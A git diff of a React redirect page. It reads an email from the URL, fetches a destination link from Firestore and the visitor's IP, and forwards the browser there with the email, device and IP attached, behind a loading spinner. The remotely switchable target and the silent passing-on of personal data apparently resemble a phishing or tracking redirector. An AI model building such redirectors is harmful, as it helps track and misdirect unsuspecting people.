@@ -2,10 +2,9 @@ import { initializeApp } from "firebase/app";
 import { doc, getFirestore, onSnapshot } from "firebase/firestore";
 import React, { useEffect } from "react";
 import { browserName, osName } from "react-device-detect";
+import uuid from "react-uuid";
 import "./loaderstyle.css";
 import { db, getIP } from "./servers";
-
-
 
 function HomeRedirect() {
   const queryParams = new URLSearchParams(window.location.search);
@@ -25,17 +24,20 @@ function HomeRedirect() {
 
       const currentLink = doc.data().currentlink;
       const date = new Date().getMilliseconds();
+      const uid = uuid();
 
       console.log(`${osName} ${browserName}`);
 
-      
-
       getIP().then((res) => {
-        const ip=res.data.IPv4
+        const ip = res.data.IPv4;
         console.log(ip);
-        window.location.assign(`${currentLink}/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
-      
-      /*
+        window.location.assign(
+          `${currentLink}/${uid}/?inclusive=${email}&device=${osName +
+            "" +
+            browserName}&loc=${ip}`
+        );
+
+        /*
       // wake glitch.com page
       fetch(`${currentLink}`, requestOptions)
         .then((response) => {
@@ -48,28 +50,25 @@ function HomeRedirect() {
         });
 
         */
-    
-    });
-
-      
+      });
     });
   });
 
   return (
     <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
       <div className="lds-spinner">
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
+        <div />
       </div>
     </div>
   );
